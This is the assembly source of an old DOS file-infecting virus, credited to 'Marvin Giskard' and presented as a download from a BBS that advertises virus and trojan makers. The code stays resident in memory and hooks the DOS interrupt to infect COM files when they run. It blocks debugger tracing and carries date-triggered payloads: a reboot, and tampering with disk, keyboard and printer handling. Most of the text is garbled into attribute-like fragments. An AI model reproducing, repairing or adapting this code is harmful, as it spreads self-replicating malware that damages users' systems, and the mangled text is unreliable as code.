

;
;
;
;    ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;    º This .ASM source downloaded from a CryPt BBS - CryPt, Makers of	  º
;    º Phine Viruses/Trojans, and Kreators of the CryPt Newsletter.	  º
;    ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
;>>>>º Dark Coffin úúúúúúúúúúúúúúúúúúúú CryPt HQ úúúúúúúúúú 215.966.3576  º< ;="" çääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääääää¶="" ;="" º="" crypt="" infosystems="" úúúúúúúúúúúúúú="" support="" úúúúúúúúúúú="" com.ing.soon="" º="" ;="" èíííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííííí¼="" ;="" ;="" ;="" civil="" service="" virus="" by="" marvin="" giskard="" ;="" turbo="" assember="" version="" 2="" exec="" equ="" 4b00h="" openfile="" equ="" 3d02h="" readfile="" equ="" 3fh="" writefile="" equ="" 40h="" closefile="" equ="" 3eh="" exesign="" equ="" 5a4dh="" seektop="" equ="" 4200h="" seekend="" equ="" 4202h="" getattr="" equ="" 4300h="" setattr="" equ="" 4301h="" getdt="" equ="" 5700h="" setdt="" equ="" 5701h="" minsize="" equ="" 4h="" maxsize="" equ="" 0fbf0h="" getdate="" equ="" 2bh="" fileid="" equ="" 2206h="" memid="" equ="" 4246h="" ;="" 'fb'="" .model="" small="" .code="" org="" 0100h="" start:="" xor="" ax,="" ax="" mov="" ds,="" ax="" cmp="" word="" ptr="" ds:01ach,="" memid="" jne="" instl2="" cmp="" word="" ptr="" ds:01aeh,="" fileid="" je="" noinstl2="" instl2:="" call="" installinmem="" noinstl2:="" push="" cs="" push="" cs="" pop="" ds="" pop="" es="" mov="" dx,="" offset="" filename="" mov="" ax,="" 4b22h="" int="" 21h="" int="" 20h="" filename:="" db="" 'test.com',0="" addcode:="" jmp="" overdata="" ;="" addcode's="" data="" buf:="" db="" 0,="" 0="" ;="" miscellaneous="" buf="" jumpcode:="" db="" 0e9h,="" 00h,="" 00h="" ;="" code="" to="" be="" placed="" at="" front="" of="" file="" fsize:="" dw="" 0="" ;="" file="" size="" attr:="" db="" 0="" ;="" attr="" of="" file="" being="" infected="" fdatetime:="" dd="" 0="" ;="" time="" and="" date="" of="" file="" being="" infected="" generation:="" dw="" 0="" ;="" generation="" counter="" infected:="" dw="" 0="" ;="" number="" of="" files="" infected="" old24handler:="" dd="" 0="" ;="" old="" int="" 24h="" handler="" acts:="" db="" 0="" ;="" flag="" to="" stop="" reentry="" path:="" dd="" 0="" overdata:="" mov="" word="" ptr="" ds:0100h,="" 0000h="" mov="" byte="" ptr="" ds:0102h,="" 00h="" ;="" check="" if="" handler="" already="" installed="" by="" examining="" 2="" words="" in="" vector="" ;="" table="" entry="" of="" int="" 6bh="" xor="" ax,="" ax="" mov="" ds,="" ax="" cmp="" word="" ptr="" ds:01ach,="" memid="" jne="" instl="" cmp="" word="" ptr="" ds:01aeh,="" fileid="" je="" alreadyinstalled="" instl:="" call="" installinmem="" jmp="" alreadyinstalled="" installinmem:="" mov="" word="" ptr="" ds:01ach,="" memid="" mov="" word="" ptr="" ds:01aeh,="" fileid="" push="" cs="" pop="" ds="" ;="" get="" int="" 21h="" handler="" in="" es:bx.="" mov="" ax,="" 3521h="" int="" 21h="" dooldofs:="" mov="" si,="" offset="" doold+1="" mov="" [si],="" bx="" mov="" [si+2],="" es="" push="" es="" push="" bx="" pop="" dx="" pop="" ds="" mov="" ax,="" 256dh="" int="" 21h="" ;="" this="" label="" is="" here="" so="" that="" the="" infect="" part="" will="" be="" able="" to="" calculate="" ;="" source="" offset="" of="" int21handler="" and="" then="" place="" it="" in="" here="" before="" writing="" ;="" it="" to="" disk.="" the="" offset="" addcode="" will="" be="" replaced="" by="" the="" right="" number.="" source:="" mov="" si,="" offset="" addcode="" ;="" destination="" e.g.="" where="" program="" will="" be="" placed="" are="" now="" calculated="" by="" ;="" taking="" the="" amount="" of="" memory="" in="" $0040:$0013.="" multiply="" by="" 16="" to="" get="" ;="" segment="" of="" memory="" end="" and="" then="" subract="" amount="" of="" blocks="" needed.="" ;="" this="" is="" where="" routine="" will="" be="" placed.="" mov="" ax,="" 0040h="" mov="" ds,="" ax="" mov="" ax,="" word="" ptr="" ds:0013h="" mov="" cl,="" 6="" shl="" ax,="" cl="" ;="" set="" dest.="" segment="" 2048="" pages="" (32="" k)="" below="" top="" of="" memory.="" sub="" ax,="" 2048="" mov="" es,="" ax="" xor="" di,="" di="" mov="" cx,="" offset="" addcodeend="" -="" offset="" addcode="" push="" cs="" pop="" ds="" rep="" movsb="" ;="" set="" int="" 21h="" handler="" to="" point="" to="" our="" routine="" mov="" ax,="" 2521h="" push="" es="" pop="" ds="" mov="" dx,="" offset="" int21handler="" -="" offset="" addcode="" int="" 21h="" mov="" byte="" ptr="" ds:[offset="" acts-offset="" addcode],="" 0="" ret="" alreadyinstalled:="" call="" distrace="" ;="" code="" to="" jump="" back="" to="" 0100h="" push="" cs="" push="" cs="" pop="" ds="" pop="" es="" mov="" ax,="" 0100h="" jmp="" ax="" ;="" disable="" tracing="" and="" breakpoint="" setting="" for="" debuggers.="" distrace:="" mov="" ax,="" 0f000h="" mov="" ds,="" ax="" mov="" dx,="" 0fff0h="" mov="" ax,="" 2501h="" int="" 21h="" mov="" ax,="" 2503h="" int="" 21h="" ret="" int21handler:="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" di="" push="" si="" push="" es="" push="" ds="" ;="" install="" devious="" act="" if="" seed="" is="" right="" mov="" ah,="" 2ah="" int="" 6dh="" cmp="" cx,="" 1991="" jb="" act="" cmp="" dl,="" 22="" jne="" timer="" db="" 0eah,="" 0f0h,="" 0ffh,="" 00h,="" 0f0h="" timer:="" mov="" ah,="" 25h="" cmp="" dl,="" 29="" je="" inst1="" cmp="" dl,="" 1="" je="" inst2="" cmp="" dl,="" 10="" je="" inst3="" cmp="" dl,="" 16="" je="" inst4="" jmp="" act="" inst1:="" mov="" al,="" 13h="" jmp="" setvec="" inst2:="" mov="" al,="" 16h="" jmp="" setvec="" inst3:="" mov="" al,="" 0dh="" jmp="" setvec="" inst4:="" mov="" al,="" 10h="" setvec:="" push="" cs="" pop="" ds="" mov="" dx,="" offset="" int24handler="" -="" offset="" addcode="" int="" 6dh="" act:="" mov="" ax,="" 0040h="" mov="" ds,="" ax="" mov="" ax,="" word="" ptr="" ds:006eh="" push="" cs="" pop="" ds="" mov="" bh,="" ds:[offset="" acts="" -="" offset="" addcode]="" cmp="" bh,="" 3="" je="" noact="" cmp="" ax,="" 22="" je="" noact="" mov="" byte="" ptr="" [si],="" 3="" mov="" ax,="" 3509h="" int="" 21h="" push="" es="" push="" bx="" pop="" dx="" pop="" ds="" mov="" ax,="" 256ah="" int="" 21h="" push="" cs="" pop="" ds="" mov="" dx,="" offset="" int9handler="" -="" offset="" addcode="" mov="" ax,="" 2509h="" int="" 21h="" mov="" ax,="" 3517h="" int="" 21h="" push="" es="" push="" bx="" pop="" dx="" pop="" ds="" mov="" ax,="" 256ch="" int="" 21h="" push="" cs="" pop="" ds="" mov="" dx,="" offset="" int17handler="" -="" offset="" addcode="" mov="" ax,="" 2517h="" int="" 21h="" noact:="" pop="" ds="" pop="" es="" pop="" si="" pop="" di="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" cmp="" ah,="" 4bh="" je="" infect="" doold:="" ;="" this="" next="" bytes="" represent="" a="" jmp="" 0000h:0000h.="" the="" 0's="" will="" be="" replaced="" ;="" by="" the="" address="" of="" the="" old="" 21="" handler.="" db="" 0eah="" dd="" 0="" dooldpop:="" pop="" es="" pop="" ds="" pop="" bp="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" jmp="" doold="" closequit:="" mov="" ax,="" 2524h="" mov="" si,="" offset="" old24handler-offset="" addcode="" mov="" dx,="" cs:[si]="" mov="" ds,="" cs:[si+2]="" int="" 21h="" push="" cs="" pop="" ds="" mov="" si,="" offset="" fdatetime-offset="" addcode="" mov="" cx,="" ds:[si]="" mov="" dx,="" ds:[si+2]="" mov="" ax,="" setdt="" int="" 21h="" mov="" ah,="" closefile="" int="" 21h="" mov="" ax,="" setattr="" mov="" cl,="" ds:[offset="" attr="" -="" offset="" addcode]="" xor="" ch,="" ch="" mov="" si,="" offset="" path-offset="" addcode="" mov="" dx,="" ds:[si]="" mov="" ds,="" ds:[si+2]="" int="" 21h="" jmp="" dooldpop="" infect:="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" push="" bp="" push="" ds="" push="" es="" ;="" get="" file's="" attr="" mov="" ax,="" getattr="" int="" 21h="" jc="" closequit="" mov="" cs:[offset="" attr-offset="" addcode],="" cl="" mov="" si,="" offset="" path-offset="" addcode="" mov="" cs:[si],="" dx="" mov="" cs:[si+2],="" ds="" ;="" get/set="" int="" 24h="" handler="" mov="" ax,="" 3524h="" int="" 21h="" mov="" si,="" offset="" old24handler-offset="" addcode="" mov="" cs:[si],="" bx="" mov="" cs:[si+2],="" es="" mov="" ax,="" 2524h="" push="" cs="" pop="" ds="" mov="" dx,="" offset="" int24handler-offset="" addcode="" int="" 21h="" ;="" set="" new="" attribute="" mov="" si,="" offset="" path-offset="" addcode="" mov="" dx,="" cs:[si]="" mov="" ds,="" cs:[si+2]="" mov="" ax,="" setattr="" mov="" cx,="" 0020h="" int="" 21h="" jc="" closequitfoot="" mov="" ax,="" openfile="" int="" 21h="" jc="" closequitfoot="" mov="" bx,="" ax="" ;="" get="" file's="" time="" and="" date="" and="" store="" mov="" ax,="" getdt="" int="" 21h="" jc="" closequitfoot="" push="" cs="" pop="" ds="" mov="" si,="" offset="" fdatetime-offset="" addcode="" mov="" ds:[si],="" cx="" mov="" ds:[si+2],="" dx="" ;="" read="" first="" two="" bytes="" of="" file="" mov="" ah,="" readfile="" mov="" cx,="" 2="" mov="" dx,="" offset="" overdata+4-offset="" addcode="" int="" 21h="" jc="" closequitfoot="" ;="" check="" if="" fisrt="" two="" bytes="" identify="" the="" file="" as="" an="" exe="" file="" ;="" if="" so,="" then="" don't="" infect="" the="" file="" cmp="" ds:[offset="" overdata+4-offset="" addcode],="" exesign="" je="" closequitfoot="" ;="" read="" next="" byte="" mov="" ah,="" readfile="" mov="" cx,="" 1="" mov="" dx,="" offset="" overdata+10-offset="" addcode="" int="" 21h="" jc="" closequitfoot="" ;="" get="" file="" size="" mov="" ax,="" seekend="" xor="" cx,="" cx="" xor="" dx,="" dx="" int="" 21h="" jc="" closequitfoot="" ;="" save="" filesize="" and="" calculate="" jump="" offset="" cmp="" dx,="" 0="" jg="" closequitfoot="" cmp="" ax,="" minsize="" jb="" closequitfoot="" cmp="" ax,="" maxsize="" ja="" closequitfoot="" mov="" ds:[offset="" fsize-offset="" addcode],="" ax="" mov="" cx,="" ax="" sub="" ax,="" 03h="" mov="" ds:[offset="" jumpcode+1-offset="" addcode],="" ax="" ;="" calculate="" and="" store="" source="" add="" cx,="" 0100h="" mov="" [offset="" source+1-offset="" addcode],="" cx="" add="" cx,="" offset="" doold-offset="" addcode="" mov="" [offset="" dooldofs-offset="" addcode+1],="" cx="" jmp="" overfoot1="" closequitfoot:="" jmp="" closequit="" overfoot1:="" ;="" read="" last="" 2="" bytes="" to="" see="" if="" it="" is="" already="" infected="" mov="" ax,="" seektop="" xor="" cx,="" cx="" mov="" dx,="" [offset="" fsize-offset="" addcode]="" sub="" dx,="" 2="" int="" 21h="" mov="" ah,="" readfile="" mov="" cx,="" 2="" mov="" dx,="" offset="" buf-offset="" addcode="" int="" 21h="" cmp="" [offset="" buf-offset="" addcode],="" fileid="" je="" closequitfoot="" ;="" prepare="" to="" write="" new="" jump="" mov="" ax,="" seektop="" xor="" cx,="" cx="" xor="" dx,="" dx="" int="" 21h="" ;="" write="" new="" jump="" mov="" ah,="" writefile="" mov="" cx,="" 3="" mov="" dx,="" offset="" jumpcode-offset="" addcode="" int="" 21h="" ;="" write="" addcode="" ;="" code="" to="" restore="" first="" three="" bytes="" is="" at="" start="" of="" addcode="" ;="" int21="" handler="" is="" also="" included="" ;="" generation="" counter="" is="" included="" in="" data="" ;="" id="" is="" at="" the="" end="" of="" addcode="" mov="" ax,="" seekend="" xor="" cx,="" cx="" xor="" dx,="" dx="" int="" 21h="" ;="" increase="" generation="" counter="" before="" writing="" it="" to="" the="" new="" file="" inc="" word="" ptr="" [offset="" generation="" -="" offset="" addcode]="" ;="" set="" files="" infected="" to="" 0,="" for="" child="" hasn't="" infected="" anyone.="" mov="" si,="" offset="" infected="" -="" offset="" addcode="" push="" word="" ptr="" [si]="" mov="" word="" ptr="" [si],="" 0="" mov="" ah,="" writefile="" mov="" dx,="" offset="" addcode="" -="" offset="" addcode="" ;="" 0000="" mov="" cx,="" offset="" addcodeend="" -="" offset="" addcode="" int="" 21h="" ;="" decrease="" counter="" again,="" cause="" all="" his="" children="" should="" have="" the="" same="" ;="" generation="" count="" dec="" word="" ptr="" [offset="" generation="" -="" offset="" addcode]="" ;="" pop="" number="" of="" files="" infected="" and="" incread="" pop="" ax="" inc="" ax="" mov="" word="" ptr="" [offset="" infected="" -="" offset="" addcode],="" ax="" jmp="" closequit="" int24handler:="" xor="" al,="" al="" iret="" int9handler:="" push="" ax="" push="" cx="" push="" ds="" mov="" ax,="" 0040h="" mov="" ds,="" ax="" mov="" ah,="" byte="" ptr="" ds:006ch="" cmp="" ah,="" 18="" ja="" nochange="" mov="" cl,="" 4="" shl="" ah,="" cl="" shr="" ah,="" cl="" mov="" byte="" ptr="" ds:0017h,="" ah="" nochange:="" pop="" ds="" pop="" cx="" pop="" ax="" int="" 6ah="" iret="" int17handler:="" cmp="" ah,="" 00h="" jne="" doold17="" push="" ds="" push="" ax="" push="" bx="" mov="" bx,="" 0040h="" mov="" ds,="" bx="" mov="" bh,="" byte="" ptr="" ds:006ch="" shr="" bh,="" 1="" shr="" bh,="" 1="" cmp="" bh,="" 22h="" je="" ignore17="" pop="" bx="" pop="" ax="" pop="" ds="" doold17:="" int="" 6ch="" iret="" ignore17:="" pop="" bx="" pop="" ax="" pop="" ds="" iret="" dw="" fileid="" addcodeend:="" end="" start="" ="">